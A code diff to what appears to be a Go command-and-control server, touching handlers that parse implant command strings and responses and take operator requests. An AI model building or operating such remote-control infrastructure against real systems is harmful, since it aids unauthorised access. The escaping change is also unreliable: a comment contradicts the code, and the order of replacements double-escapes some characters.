@@ -88,10 +88,7 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
             return
         }
 
-        // Convert the decoded bytes to string
         decodedString := string(decodedBytes)
-        fmt.Println(decodedString)
-        // Split the decoded string by &)
         params := strings.Split(decodedString, "&")
         paramMap := make(map[string]string)
 
@@ -99,7 +96,10 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
             keyValue := strings.Split(param, "=")
             if len(keyValue) == 2 {
                 key := keyValue[0]
-                value := keyValue[1]
+                value := strings.TrimSpace(keyValue[1])
+                value = strings.Replace(value, "\r", "\\r", -1) // Replace any carriage returns (\r) with an empty string
+                value = strings.Replace(value, "\\", "\\\\", -1) // Escape any backslashes in the value
+                value = strings.Replace(value, "\n", "\\n", -1) // Remove newlines
                 paramMap[key] = value
             }
         }
@@ -109,8 +109,6 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
             Command:  paramMap["cmdString"],
             Response: paramMap["cmdResponse"],
         }
-
-
 
     } else {
         http.Error(w, "No parameter found in the request", http.StatusBadRequest)
@@ -139,7 +137,7 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 }
 
 func handleOperator(w http.ResponseWriter, r *http.Request) {
-    fmt.Println("received request")
+    fmt.Println("Received request from operator")
     // Only allow POST requests
     if r.Method != http.MethodPost {
         http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
